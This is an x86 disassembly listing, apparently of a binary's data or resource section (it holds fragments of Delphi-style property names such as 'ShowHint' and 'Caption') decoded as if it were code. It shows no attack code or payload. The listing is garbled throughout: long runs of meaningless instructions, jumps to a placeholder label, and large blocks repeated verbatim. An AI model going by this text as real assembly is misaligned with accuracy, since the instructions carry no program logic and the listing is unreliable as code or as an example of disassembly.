add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
sbb al [ eax ]
pop es
push esp
popad
bound edx [ ebx + 0x74 ]
outsd
add [ eax ] dl
inc eax
add [ esi ] bl
imul ebp [ esi + 0x74 ] r-xdata
je r-xdata
je r-xdata
add al [ eax ]
call [ ebp + ebx * 8 + 0x10043 ]
add [ eax ] al
add [ eax ] al
add [ eax + 0x1 ] al
sbb eax [ eax ]
or [ eax + ebp * 2 + 0x6f ] edx
jne r-xdata
adc [ eax ] al
push ds
add al [ eax ]
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0c001f ] al
outsb
inc ebx
push 0x69676e61
outsb
inc ebp
popad
outsb
jae r-xdata
add al [ eax ]
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0a001e ] al
outsb
inc ebx
jo r-xdata
outsd
outsb
add [ eax ] dl
inc eax
add [ ecx - 0x7b010000 ] bl
xlat
inc esp
add [ edi + edx * 8 + 0x44 ] cl
imul esp [ edx + 0x6c ] 0x40100065
add [ edi ] bl
nop
inc esp
add [ eax ] dh
add [ eax ] eax
push [ eax ]
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0e0020 ] al
outsb
inc ebx
outsd
outsb
je r-xdata
add al [ eax ]
call eax
fld [ ebx ]
adc [ eax ] al
push edi
add [ eax ] al
call [ ebp + edx * 8 + 0x44 ]
add [ eax + 0x44f6 ] dh
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
sbb al 0x0
pop es
push esi
imul esi [ ebx + 0x69 ] 0x656c62
adc [ eax ] al
pop ds
popad
inc eax
inc ebp
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
cmp bh 0xff
xchg [ eax + eax - 0x48 ] eax
aas
inc ebp
add [ eax ] bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
sbb eax 0x72570400
popad
jo r-xdata
push esi
inc ebx
add [ eax ] dh
add al [ eax ]
push [ eax ]
push es
dec edi
js r-xdata
add [ eax + 0x53080018 ] al
push 0x6948776f
outsb
je r-xdata
add [ eax ] al
outsb
je r-xdata
outsb
je r-xdata
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
and al 0x0
or ecx [ edi + 0x6e ]
push eax
outsd
jo r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
inc [ edi + edx * 8 - 0x28b3ffbc ]
inc esp
push 0x6948776f
outsb
je r-xdata
arpl [ ecx + 0x63 ] di
push ebp
jo r-xdata
dec ebp
outsd
jne r-xdata
dec ebp
outsd
jne r-xdata
mov [ eax + eax - 0x30 ] eax
add [ eax ] al
call eax
add [ eax ] al
inc [ ecx ]
add [ eax ] al
outsd
outsb
or eax 0x46697661
inc esp
outsd
ja r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0b0024 ] al
outsb
jo r-xdata
jb r-xdata
outsd
jo r-xdata
mov [ ebp ] 0xff00007c
in al dx
aad 0x44
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x50090016 ] al
add [ eax - 0x75 ] dh
jns r-xdata
inc ebp
js r-xdata
shl [ esi + ebx * 2 + 0x43 ] 0x0
add ecx [ edx ]
push esp
inc ebx
outsd
insd
insd
outsd
outsb
inc ecx
push esi
dec ecx
add [ eax ] eax
add [ eax ] al
add [ eax ] cl
add [ eax ] al
add [ eax + 0x5e ] dh
inc ebx
add [ edi ] al
popad
jbe r-xdata
punpcklwd mm6 [ esi + 0x69 ]
inc esi
imul ebp [ esi + 0x64 ] 0x706d6f43
jne r-xdata
popad
jbe r-xdata
loopne r-xdata
push 0x69676e61
outsb
xor al 0x57
inc ebx
add [ eax ] bh
add al [ eax ]
push esi
inc ebx
add [ eax ] ah
add al [ eax ]
jmp [ eax ]
pop ss
add [ eax ] cl
push eax
outsd
add [ eax ] al
add [ eax ] al
outsb
je r-xdata
add [ eax ] dh
sbb [ ebp ] al
jo r-xdata
inc esp
add [ eax + 0x3c ] dl
inc ebp
add [ edi + 0x38080045 ] cl
inc ebp
add al dh
cmp al 0x45
add [ eax + 0x1c0044fe ] cl
add eax 0x12bc0045
inc ebp
add [ eax - 0x5bffbc22 ] bh
cmovne eax [ eax ]
mov al 0xdf
inc ebx
add [ ebx + edx + 0x45 ] dl
add [ eax + 0x13 ] bl
inc ebp
add [ eax ] dl
adc al [ ebp ]
aam 0xdf
inc ebx
add [ eax ] dh
inc ebp
add [ eax ] al
sbb al 0x45
add [ eax + edx * 2 ] ah
inc ebp
add [ edx + edi + 0x3d9c0045 ] ch
inc ebp
add [ eax - 0x37ffbc1e ] ch
loop r-xdata
add [ edx + ecx + 0x33b80042 ] cl
inc eax
add [ ecx + ebx + 0x310c0045 ] dl
arpl [ gs : ecx + 0x63 ] di
insb
or eax 0x44697661
insb
je r-xdata
imul eax [ ebp + 0x6c ] 0x46657465
dec esi
inc eax
add [ eax ] ch
xor [ eax ] eax
insb
cld
inc esp
add [ ecx + ecx * 2 ] dh
inc ebp
add [ ecx + edx + 0x45 ] bl
pushad
jb r-xdata
inc ebx
add [ eax + 0x2 ] ah
add [ eax ] al
rcl [ edi + 0x11380044 ] 0x1
inc edx
add [ eax - 0x73ffbfcd ] dh
pop esp
pop edi
inc ebx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] dh
inc esi
imul ebp [ esi + 0x64 ] 0x656c6946
add [ eax + 0x4f070021 ] al
outsb
inc ebx
insb
imul esp [ ebx + 0x6b ] r-xdata
rol [ ecx ] 0x0
inc eax
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f070022 ] al
outsb
inc ebp
outsb
je r-xdata
inc esp
add al bl
add [ eax ] al
add [ eax ] al
add [ eax ] al
je r-xdata
mov ecx fs
add al ch
loop r-xdata
inc ecx
add [ ebx ] ch
inc ebx
add [ ebx + ecx * 8 ] al
inc esp
add [ eax ] dl
inc [ eax + eax + 0x1c ]
aam 0x44
add [ eax + 0x11 ] dl
inc edx
add [ eax ] bh
push cs
imul ebp [ ebp + 0x8 ] 0x436d6f43
je r-xdata
inc esi
inc edx
add [ eax ] dh
push cs
inc edx
add [ eax + 0x11 ] bl
inc edx
add [ eax ] bh
fiadd [ ebx ]
dec eax
inc esp
inc ebp
add [ edx + ebp * 8 + 0x43 ] bl
add [ eax + 0x78004548 ] dh
leave
inc esp
add ah al
inc ebp
add ah ah
inc ebp
add ah bh
cmp eax [ ebp ]
ror al 0x44
add ah al
enter 0x44 0xc0
clc
inc esp
add ah ch
clc
inc esp
add [ esp + edx * 8 ] al
inc esp
add [ edx + ecx * 8 ] bh
inc esp
add [ eax + 0x80044d5 ] dl
aad 0x44
add [ eax + ebx * 8 ] bl
inc esp
add al cl
salc
inc esp
insb
jae r-xdata
or esp [ ecx + 0x76 ]
imul eax [ ebx + 0x6f ] 0x69467970
insb
push cs
popad
jbe r-xdata
popad
jbe r-xdata
dec ebp
outsd
jne r-xdata
jb r-xdata
jae r-xdata
or [ eax + 0x6f ] dl
jb r-xdata
outsd
outsb
add [ eax ] dl
inc eax
add [ edx - 0x57010000 ] bl
xlat
inc esp
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
adc eax 0x61500e00
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
push cs
add [ eax ] cl
inc ecx
jne r-xdata
insb
jae r-xdata
inc eax
loop r-xdata
add [ eax ] cl
jecxz r-xdata
imul ebp [ esi + 0x64 ] 0x646c6f46
jb r-xdata
inc ebx
add [ eax + 0x4360 ] cl
rcr [ edi + ebx * 2 + 0x43 ] 0x0
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
xor al 0x60
or al [ edx ]
mov eax 0x94004033
insb
inc esi
imul ebp [ ebp + 0xf ] 0x45697661
insd
jo r-xdata
push edx
inc ebx
add [ edx + 0x60 ] bh
dec esi
pushad
inc ebx
outsd
jo r-xdata
outsd
insd
jo r-xdata
dec ebp
outsd
jbe r-xdata
js r-xdata
inc ebp
outsb
push ebp
inc ecx
add al cl
add [ eax ] eax
dec eax
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f060023 ] al
hlt
outsd
push ebx
imul edi [ edx + 0x65 ] r-xdata
insb
add [ eax ] eax
add [ eax ] al
or eax [ eax ]
add eax 0x67696c41
add al dl
add [ eax ] al
add [ eax ] 0x0
add [ edx + 0x43 ] bl
pop esp
loop r-xdata
add [ esi ] cl
add [ eax ] al
add [ eax ] al
add [ edx ] al
add [ eax ] al
add [ eax + edx + 0x20c0040 ] ch
add [ eax ] al
lodsb [ esi ]
adc [ eax ] al
xor [ edx ] al
add [ eax ] al
pop es
add [ ebx - 0x7aff7c00 ] al
add [ 0xd004700 ] al
mov al 0x11
mov ebp sub_43e03c
loopne r-xdata
mov al 0x33
inc eax
inc esi
imul ebp [ ebp + 0x73 ] 0x6976610b
inc ebx
outsd
jo r-xdata
je r-xdata
push 0xe0004489
add [ eax ] al
jmp eax
outsb
add [ eax ] dl
inc eax
add [ eax ] cl
add al [ eax ]
jmp [ eax + 0x10043e5 ]
add [ eax ] al
add [ ebx ] cl
add [ 0x67696c41 ] al
add [ eax ] cl
push esp
inc ecx
outsb
imul ebp [ ebp + 0x61 ] 0x88906574
pushad
inc ebx
add [ edi ] al
or [ ecx + eax * 2 + 0x6e ] dl
imul ebp [ ebp + 0x61 ] 0x5f5c6574
inc ebx
add [ ebx + ebx * 4 + 0x220044 ] al
or [ ebx + 0x6f ] al
insd
inc ebx
je r-xdata
add [ eax + eax + 0x5b ] 0x0
add bh bh
dec eax

inc ebx
add [ eax - 0x1e ] al
inc ebx
add [ eax - 0x20 ] bh
inc ebx
add [ ecx - 0x1e73ffbd ] al
sbb [ ebp ] eax
or al 0x31
arpl [ gs : ecx + 0x63 ] di
inc esi
imul ebp [ ebp + 0xe ] 0x52697661
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ esi + 0x60 ] cl
add [ eax ] al
jb r-xdata
sub_435b06
push eax
test [ eax + eax ] 0x0
add [ eax + 0x1 ] al
sldt [ edi ]
inc ebp
outsb
popad
bound ebp [ ebp + 0x64 ]
lodsb [ esi ]
adc [ eax ] al
add [ eax ] 0x0
inc [ eax + 0x70ff0000 ]
test [ eax + eax ] 0x0
add [ eax - 0x80000000 ] al
pop es
add [ eax + ecx * 2 ] al
imul ebp [ esi + 0x74 ] r-xdata
adc [ edx ] al
add bh bh
loopne r-xdata
add [ eax - 0x7f010000 ] al
add [ eax ] al
push [ eax - 0xa ]
inc esp
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x48040007 ] al
inc ebx
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
adc [ eax ] al
add ecx [ ebp + 0x69 ]
outsb
cmp al 0x10
inc eax
add [ edx ] dl
add al [ eax ]
[ eax ]
sub_435b62
fild [ ebx ]
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax + 0x64 ] al
adc [ eax ] eax
add ecx [ ebp + 0x61 ]
js r-xdata
add [ ecx ] al
adc [ eax ] al
adc al 0x2
add bh bh
jo r-xdata
add [ edx ] dl
add al [ eax ]
[ eax ]
inc ebx
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
adc al [ eax ]
or [ ecx + 0x6e ] ecx
arpl [ edx + 0x65 ] si
insd
outsb
je r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
adc [ eax ] al
add ecx [ ebp + 0x69 ]
outsb
cmp al 0x10
inc eax
mov [ eax + eax + 0x74 ] al
add [ eax ] al
dec [ eax ]
sti
inc esp
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x430b0013 ] al
outsd
outsb
jae r-xdata
jo r-xdata
jb r-xdata
mov eax 0x3800453f
outsb
jne r-xdata
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
push ss
add [ ecx ] cl
push eax
imul ebp [ esi + 0x74 ] 0x4355ec73
add [ ecx ] ch
add al [ eax ]
[ eax + 0x10043dc ]
or [ ebx + 0x68 ] dl
outsd
ja r-xdata
adc [ eax ] al
test al 0xda
inc ebx
add ah cl
fild [ ebx ]
add [ eax ] eax
add [ eax ] al
call [ eax + 0x40 ]
inc ebp
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
sbb al [ eax ]
pop es
push esp
popad
bound edx [ ebx + 0x74 ]
outsd
add [ eax ] dl
inc eax
add [ esi ] bl
imul ebp [ esi + 0x74 ] r-xdata
je r-xdata
je r-xdata
add al [ eax ]
call [ ebp + ebx * 8 + 0x10043 ]
add [ eax ] al
add [ eax ] al
add [ eax + 0x1 ] al
sbb eax [ eax ]
or [ eax + ebp * 2 + 0x6f ] edx
jne r-xdata
adc [ eax ] al
push ds
add al [ eax ]
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0c001f ] al
outsb
inc ebx
push 0x69676e61
outsb
inc ebp
popad
outsb
jae r-xdata
add al [ eax ]
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0a001e ] al
outsb
inc ebx
jo r-xdata
outsd
outsb
add [ eax ] dl
inc eax
add [ ecx - 0x7b010000 ] bl
xlat
inc esp
add [ edi + edx * 8 + 0x44 ] cl
imul esp [ edx + 0x6c ] 0x40100065
add [ edi ] bl
nop
inc esp
add [ eax ] dh
add [ eax ] eax
push [ eax ]
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0e0020 ] al
outsb
inc ebx
outsd
outsb
je r-xdata
add al [ eax ]
call eax
fld [ ebx ]
adc [ eax ] al
push edi
add [ eax ] al
call [ ebp + edx * 8 + 0x44 ]
add [ eax + 0x44f6 ] dh
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
sbb al 0x0
pop es
push esi
imul esi [ ebx + 0x69 ] 0x656c62
adc [ eax ] al
pop ds
popad
inc eax
inc ebp
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
cmp bh 0xff
xchg [ eax + eax - 0x48 ] eax
aas
inc ebp
add [ eax ] bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
sbb eax 0x72570400
popad
jo r-xdata
push esi
inc ebx
add [ eax ] dh
add al [ eax ]
push [ eax ]
push es
dec edi
js r-xdata
add [ eax + 0x53080018 ] al
push 0x6948776f
outsb
je r-xdata
add [ eax ] al
outsb
je r-xdata
outsb
je r-xdata
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
and al 0x0
or ecx [ edi + 0x6e ]
push eax
outsd
jo r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
inc [ edi + edx * 8 - 0x28b3ffbc ]
inc esp
push 0x6948776f
outsb
je r-xdata
arpl [ ecx + 0x63 ] di
push ebp
jo r-xdata
dec ebp
outsd
jne r-xdata
dec ebp
outsd
jne r-xdata
mov [ eax + eax - 0x30 ] eax
add [ eax ] al
call eax
add [ eax ] al
inc [ ecx ]
add [ eax ] al
outsd
outsb
or eax 0x46697661
inc esp
outsd
ja r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0b0024 ] al
outsb
jo r-xdata
jb r-xdata
outsd
jo r-xdata
mov [ ebp ] 0xff00007c
in al dx
aad 0x44
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x50090016 ] al
add [ eax - 0x75 ] dh
jns r-xdata
inc ebp
js r-xdata
shl [ esi + ebx * 2 + 0x43 ] 0x0
add ecx [ edx ]
push esp
inc ebx
outsd
insd
insd
outsd
outsb
inc ecx
push esi
dec ecx
add [ eax ] eax
add [ eax ] al
add [ eax ] cl
add [ eax ] al
add [ eax + 0x5e ] dh
inc ebx
add [ edi ] al
popad
jbe r-xdata
punpcklwd mm6 [ esi + 0x69 ]
inc esi
imul ebp [ esi + 0x64 ] 0x706d6f43
jne r-xdata
popad
jbe r-xdata
loopne r-xdata
push 0x69676e61
outsb
xor al 0x57
inc ebx
add [ eax ] bh
add al [ eax ]
push esi
inc ebx
add [ eax ] ah
add al [ eax ]
jmp [ eax ]
pop ss
add [ eax ] cl
push eax
outsd
add [ eax ] al
add [ eax ] al
outsb
je r-xdata
add [ eax ] dh
sbb [ ebp ] al
jo r-xdata
inc esp
add [ eax + 0x3c ] dl
inc ebp
add [ edi + 0x38080045 ] cl
inc ebp
add al dh
cmp al 0x45
add [ eax + 0x1c0044fe ] cl
add eax 0x12bc0045
inc ebp
add [ eax - 0x5bffbc22 ] bh
cmovne eax [ eax ]
mov al 0xdf
inc ebx
add [ ebx + edx + 0x45 ] dl
add [ eax + 0x13 ] bl
inc ebp
add [ eax ] dl
adc al [ ebp ]
aam 0xdf
inc ebx
add [ eax ] dh
inc ebp
add [ eax ] al
sbb al 0x45
add [ eax + edx * 2 ] ah
inc ebp
add [ edx + edi + 0x3d9c0045 ] ch
inc ebp
add [ eax - 0x37ffbc1e ] ch
loop r-xdata
add [ edx + ecx + 0x33b80042 ] cl
inc eax
add [ ecx + ebx + 0x310c0045 ] dl
arpl [ gs : ecx + 0x63 ] di
insb
or eax 0x44697661
insb
je r-xdata
imul eax [ ebp + 0x6c ] 0x46657465
dec esi
inc eax
add [ eax ] ch
xor [ eax ] eax
insb
cld
inc esp
add [ ecx + ecx * 2 ] dh
inc ebp
add [ ecx + edx + 0x45 ] bl
pushad
jb r-xdata
inc ebx
add [ eax + 0x2 ] ah
add [ eax ] al
rcl [ edi + 0x11380044 ] 0x1
inc edx
add [ eax - 0x73ffbfcd ] dh
pop esp
pop edi
inc ebx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] dh
inc esi
imul ebp [ esi + 0x64 ] 0x656c6946
add [ eax + 0x4f070021 ] al
outsb
inc ebx
insb
imul esp [ ebx + 0x6b ] r-xdata
rol [ ecx ] 0x0
inc eax
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f070022 ] al
outsb
inc ebp
outsb
je r-xdata
inc esp
add al bl
add [ eax ] al
add [ eax ] al
add [ eax ] al
je r-xdata
mov ecx fs
add al ch
loop r-xdata
inc ecx
add [ ebx ] ch
inc ebx
add [ ebx + ecx * 8 ] al
inc esp
add [ eax ] dl
inc [ eax + eax + 0x1c ]
aam 0x44
add [ eax + 0x11 ] dl
inc edx
add [ eax ] bh
push cs
imul ebp [ ebp + 0x8 ] 0x436d6f43
je r-xdata
inc esi
inc edx
add [ eax ] dh
push cs
inc edx
add [ eax + 0x11 ] bl
inc edx
add [ eax ] bh
fiadd [ ebx ]
dec eax
inc esp
inc ebp
add [ edx + ebp * 8 + 0x43 ] bl
add [ eax + 0x78004548 ] dh
leave
inc esp
add ah al
inc ebp
add ah ah
inc ebp
add ah bh
cmp eax [ ebp ]
ror al 0x44
add ah al
enter 0x44 0xc0
clc
inc esp
add ah ch
clc
inc esp
add [ esp + edx * 8 ] al
inc esp
add [ edx + ecx * 8 ] bh
inc esp
add [ eax + 0x80044d5 ] dl
aad 0x44
add [ eax + ebx * 8 ] bl
inc esp
add al cl
salc
inc esp
insb
jae r-xdata
or esp [ ecx + 0x76 ]
imul eax [ ebx + 0x6f ] 0x69467970
insb
push cs
popad
jbe r-xdata
popad
jbe r-xdata
dec ebp
outsd
jne r-xdata
jb r-xdata
jae r-xdata
or [ eax + 0x6f ] dl
jb r-xdata
outsd
outsb
add [ eax ] dl
inc eax
add [ edx - 0x57010000 ] bl
xlat
inc esp
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
adc eax 0x61500e00
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
push cs
add [ eax ] cl
inc ecx
jne r-xdata
insb
jae r-xdata
inc eax
loop r-xdata
add [ eax ] cl
jecxz r-xdata
imul ebp [ esi + 0x64 ] 0x646c6f46
jb r-xdata
inc ebx
add [ eax + 0x4360 ] cl
rcr [ edi + ebx * 2 + 0x43 ] 0x0
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
xor al 0x60
or al [ edx ]
mov eax 0x94004033
insb
inc esi
imul ebp [ ebp + 0xf ] 0x45697661
insd
jo r-xdata
push edx
inc ebx
add [ edx + 0x60 ] bh
dec esi
pushad
inc ebx
outsd
jo r-xdata
outsd
insd
jo r-xdata
dec ebp
outsd
jbe r-xdata
js r-xdata
inc ebp
outsb
push ebp
inc ecx
add al cl
add [ eax ] eax
dec eax
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f060023 ] al
hlt
outsd
push ebx
imul edi [ edx + 0x65 ] r-xdata
insb
add [ eax ] eax
add [ eax ] al
or eax [ eax ]
add eax 0x67696c41
add al dl
add [ eax ] al
add [ eax ] 0x0
add [ edx + 0x43 ] bl
pop esp
loop r-xdata
add [ esi ] cl
add [ eax ] al
add [ eax ] al
add [ edx ] al
add [ eax ] al
add [ eax + edx + 0x20c0040 ] ch
add [ eax ] al
lodsb [ esi ]
adc [ eax ] al
xor [ edx ] al
add [ eax ] al
pop es
add [ ebx - 0x7aff7c00 ] al
add [ 0xd004700 ] al
mov al 0x11
mov ebp sub_43e03c
loopne r-xdata
mov al 0x33
inc eax
inc esi
imul ebp [ ebp + 0x73 ] 0x6976610b
inc ebx
outsd
jo r-xdata
je r-xdata
push 0xe0004489
add [ eax ] al
jmp eax
outsb
add [ eax ] dl
inc eax
add [ eax ] cl
add al [ eax ]
jmp [ eax + 0x10043e5 ]
add [ eax ] al
add [ ebx ] cl
add [ 0x67696c41 ] al
add [ eax ] cl
push esp
inc ecx
outsb
imul ebp [ ebp + 0x61 ] 0x88906574
pushad
inc ebx
add [ edi ] al
or [ ecx + eax * 2 + 0x6e ] dl
imul ebp [ ebp + 0x61 ] 0x5f5c6574
inc ebx
add [ ebx + ebx * 4 + 0x220044 ] al
or [ ebx + 0x6f ] al
insd
inc ebx
je r-xdata
add [ eax + eax + 0x5b ] 0x0
add bh bh
dec eax

inc ebx
add [ eax - 0x1e ] al
inc ebx
add [ eax - 0x20 ] bh
inc ebx
add [ ecx - 0x1e73ffbd ] al
sbb [ ebp ] eax
or al 0x31
arpl [ gs : ecx + 0x63 ] di
inc esi
imul ebp [ ebp + 0xe ] 0x52697661
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ esi + 0x60 ] cl
add [ eax ] al
jb r-xdata
sub_435bce
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
adc al 0x0
or ecx [ edi + 0x72 ]
imul esp [ ebp + 0x6e ] 0x69746174
add [ eax ] al
outsb
je r-xdata
jb r-xdata
popad
xchg [ eax + eax - 0x48 ] eax
aas
inc ebp
add [ eax ] bh
add [ eax + 0x53080018 ] al
push 0x6948776f
outsb
je r-xdata
add [ eax ] al
inc [ edi + edx * 8 - 0x28b3ffbc ]
inc esp
push 0x6948776f
outsb
je r-xdata
jb r-xdata
mov [ ebp ] 0xff00007c
in al dx
aad 0x44
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x50090016 ] al
outsd
jo r-xdata
add [ eax ] al
add [ eax ] al
outsb
je r-xdata
call [ eax + 0x40 ]
inc ebp
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
sbb al [ eax ]
pop es
push esp
popad
bound edx [ ebx + 0x74 ]
outsd
jo r-xdata
je r-xdata
je r-xdata
pop ss
add [ eax ] cl
push eax
outsd
add [ eax ] al
add [ eax ] al
je r-xdata
adc [ eax ] al
push ds
inc eax
inc ebp
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
cmp bh 0xff
mov eax 0x3800453f
outsb
jne r-xdata
add al [ eax ]
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0a001e ] al
outsb
inc ebx
jo r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
outsd
outsb
add [ eax ] dl
inc eax
add [ ecx - 0x7b010000 ] bl
xlat
inc esp
add [ edi + edx * 8 + 0x44 ] cl
jae r-xdata
or [ eax + 0x6f ] dl
outsd
outsb
add [ eax ] dl
inc eax
add [ edx - 0x57010000 ] bl
xlat
inc esp
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
adc eax 0x61500e00
add al [ eax ]
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0c001f ] al
outsb
inc ebx
push 0x69676e61
outsb
inc ebp
popad
outsb
jae r-xdata
or [ ebx + 0x68 ] dl
outsd
ja r-xdata
adc [ eax ] al
test al 0xda
inc ebx
add ah cl
fild [ ebx ]
add [ eax ] eax
add [ eax ] al
imul esp [ edx + 0x6c ] 0x40100065
add [ edi ] bl
nop
inc esp
add [ eax ] dh
add [ eax ] eax
push [ eax ]
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0e0020 ] al
outsb
inc ebx
outsd
outsb
je r-xdata
add al [ eax ]
call eax
fld [ ebx ]
adc [ eax ] al
push edi
add [ eax ] al
call [ ebp + edx * 8 + 0x44 ]
add [ eax + 0x44f6 ] dh
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
sbb al 0x0
pop es
push esi
imul esi [ ebx + 0x69 ] 0x656c62
adc [ eax ] al
pop ds
add al [ eax ]
call [ ebp + ebx * 8 + 0x10043 ]
add [ eax ] al
add [ eax ] al
add [ eax + 0x1 ] al
sbb eax [ eax ]
or [ eax + ebp * 2 + 0x6f ] edx
jne r-xdata
add [ eax ] dl
inc eax
add [ esi ] bl
imul ebp [ esi + 0x74 ] r-xdata
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
sbb eax 0x72570400
popad
jo r-xdata
push esi
inc ebx
add [ eax ] dh
add al [ eax ]
push [ eax ]
push es
dec edi
js r-xdata
outsb
je r-xdata
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
and al 0x0
or ecx [ edi + 0x6e ]
push eax
outsd
jo r-xdata
arpl [ ecx + 0x63 ] di
push ebp
jo r-xdata
dec ebp
outsd
jne r-xdata
dec ebp
outsd
jne r-xdata
mov [ eax + eax - 0x30 ] eax
add [ eax ] al
call eax
add [ eax ] al
inc [ ecx ]
add [ eax ] al
outsd
outsb
or eax 0x46697661
inc esp
outsd
ja r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0b0024 ] al
outsb
jo r-xdata
add [ eax - 0x75 ] dh
jns r-xdata
inc ebp
js r-xdata
shl [ esi + ebx * 2 + 0x43 ] 0x0
add ecx [ edx ]
push esp
inc ebx
outsd
insd
insd
outsd
outsb
inc ecx
push esi
dec ecx
add [ eax ] eax
add [ eax ] al
add [ eax ] cl
add [ eax ] al
add [ eax + 0x5e ] dh
inc ebx
add [ edi ] al
popad
jbe r-xdata
punpcklwd mm6 [ esi + 0x69 ]
inc esi
imul ebp [ esi + 0x64 ] 0x706d6f43
jne r-xdata
popad
jbe r-xdata
loopne r-xdata
push 0x69676e61
outsb
xor al 0x57
inc ebx
add [ eax ] bh
add al [ eax ]
push esi
inc ebx
add [ eax ] ah
add al [ eax ]
jmp [ eax ]
add [ eax ] dh
sbb [ ebp ] al
jo r-xdata
inc esp
add [ eax + 0x3c ] dl
inc ebp
add [ edi + 0x38080045 ] cl
inc ebp
add al dh
cmp al 0x45
add [ eax + 0x1c0044fe ] cl
add eax 0x12bc0045
inc ebp
add [ eax - 0x5bffbc22 ] bh
cmovne eax [ eax ]
mov al 0xdf
inc ebx
add [ ebx + edx + 0x45 ] dl
add [ eax + 0x13 ] bl
inc ebp
add [ eax ] dl
adc al [ ebp ]
aam 0xdf
inc ebx
add [ eax ] dh
inc ebp
add [ eax ] al
sbb al 0x45
add [ eax + edx * 2 ] ah
inc ebp
add [ edx + edi + 0x3d9c0045 ] ch
inc ebp
add [ eax - 0x37ffbc1e ] ch
loop r-xdata
add [ edx + ecx + 0x33b80042 ] cl
inc eax
add [ ecx + ebx + 0x310c0045 ] dl
arpl [ gs : ecx + 0x63 ] di
insb
or eax 0x44697661
insb
je r-xdata
imul eax [ ebp + 0x6c ] 0x46657465
